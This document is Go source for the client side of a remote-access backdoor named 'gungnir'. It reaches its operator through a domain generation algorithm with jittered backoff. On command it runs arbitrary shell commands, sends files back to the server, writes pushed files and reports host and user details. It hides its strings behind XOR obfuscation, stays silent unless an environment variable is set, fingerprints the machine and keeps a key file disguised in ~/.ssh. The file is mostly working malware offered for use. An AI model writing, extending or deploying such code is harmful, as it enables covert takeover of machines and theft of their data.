package main

import (
    "encoding/hex"
    "encoding/json"
    "crypto/sha256"
    "errors"
    "flag"
    "fmt"
    "io"
    "log"
    "math/rand"
    "net"
    "os"
    "os/exec"
    "os/user"
    "path/filepath"
    "runtime"
    "strings"
    "sync"
    "time"
    
    p "gungnir/internal/proto"
    u "gungnir/internal/utils"
    s "gungnir/internal/secure"
)

var blackhole = "If you feel you are in a black hole, don’t give up. There’s a way out."
var _ = blackhole

var BuildID string
var _ = BuildID

type Client struct {
    id   string
    conn net.Conn
    send chan *p.Message
    wg   sync.WaitGroup
}

func main() {
    if os.Getenv(u.Xor("\xba\xbb\xbc\xab\xb9")) == "" {
        log.SetOutput(io.Discard)
    }

    id := flag.String("id", "", "client id, default hostname")
    addr := flag.String("addr", "", "server address in host:port format")
    flag.Parse()

    if home, err := os.UserHomeDir(); err == nil {
        marker := filepath.Join(home, u.Xor("\xd0\x99\x8b\x90\x99\x90\x97\x8c"))
        if _, err := os.Stat(marker); err == nil {
            log.Printf("%s exists, exiting", marker)
            return
        }
    }

    if *id == "" {
        *id = hostnameFallback()
    }

    id2, err := generateFingerprint()
    if err != nil {
        id2 = hostnameFallback()
    }

    concatStringRef(id, id2)

    rand.Seed(time.Now().UnixNano())

    for {
        conn, picked := dialWithBackoff(*addr)
        log.Printf("connected to %s", picked)

        if err := runSession(*id, conn); err != nil {
            log.Printf("session ended with error: %v", err)
        } else {
            log.Printf("session ended")
        }

        _ = conn.Close()
        sleepWithJitter(2*time.Second, 500*time.Millisecond)
    }
}

func dialWithBackoff(addr string) (net.Conn, string) {
    attempt := 0
    backoff := 1 * time.Second
    maxBackoff := 30 * time.Second

    for {
        if addr != "" {
            attempt++
            conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
            if err == nil {
                return conn, addr
            }

            log.Printf("dial attempt #%d to %s failed: %v", attempt, addr, err)
            sleepWithJitter(backoff, backoff*2)

            backoff *= 2
            if backoff > maxBackoff {
                backoff = maxBackoff
            }
            continue
        }

        for genAddr := range u.GenDomainsStream(dgaSeed, 16) {
            attempt++
            conn, err := net.DialTimeout("tcp", genAddr, 5*time.Second)
            if err == nil {
                return conn, genAddr
            }

            log.Printf("dial attempt #%d to %s failed: %v", attempt, genAddr, err)
            sleepWithJitter(backoff, backoff*2)
        }

        backoff *= 2
        if backoff > maxBackoff {
            backoff = maxBackoff
        }
    }
}

func sleepWithJitter(base time.Duration, jitter time.Duration) {
    if jitter <= 0 {
        time.Sleep(base)
        return
    }

    extra := time.Duration(rand.Int63n(int64(jitter)))
    time.Sleep(base + extra)
}

func runSession(id string, conn net.Conn) error {
    removeIfExists(pinFilePath())

    // TOFU handshake
    sess, err := s.ClientTOFU(conn, loadPinned, savePinned)
    if err != nil {
        return fmt.Errorf("TOFU handshake fail: %w", err)
    }

    // read server build id
    b, err := sess.ReadMsg()
    if err != nil {
        return fmt.Errorf("read build id: %w", err)
    }

    var hello p.Message
    if err := json.Unmarshal(b, &hello); err != nil {
        return fmt.Errorf("decode build id: %w", err)
    }
    if hello.Type != "build_id" {
        return fmt.Errorf("unexpected first message type: %s", hello.Type)
    }
    if hello.BuildID != BuildID {
        return fmt.Errorf("build id mismatch: server=%s client=%s", hello.BuildID, BuildID)
    }

    c := &Client{
        id:   id,
        conn: conn,
        send: make(chan *p.Message, 32),
    }

    // crypto writer
    c.wg.Add(1)
    go func() {
        defer c.wg.Done()
        for msg := range c.send {
            b, err := json.Marshal(msg)
            if err != nil {
                log.Printf("json marshal error: %v", err)
                return
            }

            if err := sess.WriteMsg(b); err != nil {
                log.Printf("write error: %v", err)
                return
            }
        }
    }()

    // register
    c.send <- &p.Message{Type: "register", ClientID: c.id}
    log.Printf("registered as %s", c.id)

    // reader loop
    for {
        b, err := sess.ReadMsg()
        if err != nil {
            if errors.Is(err, io.EOF) {
                log.Printf("server closed")
                break
            }

            return fmt.Errorf("read error: %w", err)
        }

        var msg p.Message
        if err := json.Unmarshal(b, &msg); err != nil {
            return fmt.Errorf("json decode: %w", err)
        }

        switch msg.Type {
        case "secure_reset":
            if len(msg.Data) != 32 {
                log.Printf("bad secure_reset payload")
                continue
            }

            var newPub [32]byte
            copy(newPub[:], msg.Data)
            if err := sess.RekeyClientTOFU(newPub, savePinned); err != nil {
                log.Printf("rekey failed: %v", err)
                continue
            }

            ack := &p.Message{ID: msg.ID, Type: "secure_reset_ack"}
            b, _ := json.Marshal(ack)
            if err := sess.WriteMsg(b); err != nil {
                log.Printf("ack write failed: %v", err)
            }
        case "file":
            go c.handleFile(&msg)
        case "pull_file":
            go c.handlePullFile(&msg)
        case "cmd":
            go c.handleCmd(&msg)
        case "ping":
            c.send <- &p.Message{ID: msg.ID, Type: "pong"}
        case "info":
            go c.handleInfo(&msg)
        default:
            log.Printf("unknown msg type: %s", msg.Type)
        }
    }

    close(c.send)
    c.wg.Wait()
    return nil
}

func (c *Client) handleFile(msg *p.Message) {
    err := saveFile(msg.FilePath, msg.Data)
    if err == nil && msg.Checksum != "" {
        sum, sumErr := p.SHA256FileHex(msg.FilePath)
        if sumErr != nil {
            err = fmt.Errorf("saved but checksum read failed: %v", sumErr)
        } else if !strings.EqualFold(sum, msg.Checksum) {
            err = fmt.Errorf("checksum mismatch expected=%s got=%s", msg.Checksum, sum)
        }
    }

    reply := &p.Message{
        ID:    msg.ID,
        Type:  "file_ack",
        Error: errString(err),
    }

    c.send <- reply
}

func (c *Client) handlePullFile(msg *p.Message) {
    path := strings.TrimSpace(msg.FilePath)
    if path == "" {
        c.send <- &p.Message{ID: msg.ID, Type: "file", Error: "empty src path"}
        return
    }

    data, err := os.ReadFile(path)
    sum := ""
    if err == nil {
        sum = p.SHA256Hex(data)
    }

    c.send <- &p.Message{
        ID:       msg.ID,
        Type:     "file",
        FilePath: msg.FilePath,
        Data:     data,
        Checksum: sum,
        Error:    errString(err),
    }
}

func (c *Client) handleCmd(msg *p.Message) {
    out, code, err := runShell(msg.Command)

    reply := &p.Message{
        ID:       msg.ID,
        Type:     "cmd_result",
        Output:   out,
        ExitCode: code,
        Error:    errString(err),
    }

    c.send <- reply
}

func (c *Client) handleInfo(msg *p.Message) {
    h, _ := os.Hostname()
    u, _ := user.Current()
    reply := &p.Message{
        ID:       msg.ID,
        Type:     "info_result",
        Hostname: h,
        OS:       runtime.GOOS,
        Arch:     runtime.GOARCH,
        Username: u.Username,
    }

    c.send <- reply
}

func saveFile(path string, data []byte) error {
    if path == "" {
        return fmt.Errorf("empty path")
    }

    dir := filepath.Dir(path)
    if dir != "." {
        if err := os.MkdirAll(dir, 0o755); err != nil {
            return err
        }
    }

    return os.WriteFile(path, data, 0o644)
}

func runShell(cmdline string) (string, int, error) {
    if strings.TrimSpace(cmdline) == "" {
        return "", 0, nil
    }

    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", cmdline)
    } else {
        cmd = exec.Command("/bin/sh", "-c", cmdline)
    }

    out, err := cmd.CombinedOutput()
    code := 0
    if err != nil {
        var ee *exec.ExitError
        if errors.As(err, &ee) {
            code = ee.ExitCode()
        } else {
            code = -1
        }
    }

    return string(out), code, err
}

func errString(err error) string {
    if err == nil {
        return ""
    }

    return err.Error()
}

func hostnameFallback() string {
    h, err := os.Hostname()
    if err != nil || h == "" {
        return "client-" + p.NewID()
    }

    return h
}

// ========== Pin TOFU em arquivo ==========

func pinFilePath() string {
    if v := strings.TrimSpace(os.Getenv("GUNGNIR_PIN_FILE")); v != "" {
        return v
    }

    home, _ := os.UserHomeDir()
    if home == "" {
        home = "."
    }

    sshDir := filepath.Join(home, ".ssh")
    _ = os.MkdirAll(sshDir, 0o700)

    return filepath.Join(sshDir, u.Xor("\x99\xa1\x8d\x9b\x8c\x88\x9b\x8c\xd0\x96\x9b\x86"))
}

func loadPinned() ([32]byte, bool) {
    var out [32]byte
    p := pinFilePath()
    b, err := os.ReadFile(p)
    if err != nil {
        return out, false
    }

    raw, err := hex.DecodeString(strings.TrimSpace(string(b)))
    if err != nil || len(raw) != 32 {
        return out, false
    }

    copy(out[:], raw)
    return out, true
}

func savePinned(pub [32]byte) error {
    p := pinFilePath()
    tmp := p + ".tmp"

    if err := os.WriteFile(tmp, []byte(hex.EncodeToString(pub[:])+"\n"), 0o600); err != nil {
        return err
    }

    return os.Rename(tmp, p)
}

func generateFingerprint() (string, error) {
    var data strings.Builder

    // hostname
    if h, err := os.Hostname(); err == nil {
        data.WriteString(h)
    }

    // machine-id (Linux)
    if runtime.GOOS == "linux" {
        if b, err := os.ReadFile("/etc/machine-id"); err == nil {
            data.Write(b)
        }
    }

    // network MACs
    if ifs, err := net.Interfaces(); err == nil {
        for _, iface := range ifs {
            if len(iface.HardwareAddr) > 0 {
                data.WriteString(iface.HardwareAddr.String())
            }
        }
    }

    // CPU arch
    data.WriteString(runtime.GOARCH)

    // Hash
    sum := sha256.Sum256([]byte(data.String()))
    return hex.EncodeToString(sum[:]), nil
}

func concatStringRef(value1 *string, value2 string) {
    if value1 == nil {
        return
    }

    *value1 = *value1 + "-" + value2
}

func removeIfExists(path string) (bool, error) {
    _, err := os.Stat(path)
    if os.IsNotExist(err) {
        return false, nil
    }

    if err != nil {
        return false, err
    }

    if err := os.Remove(path); err != nil {
        return false, err
    }

    return true, nil
}

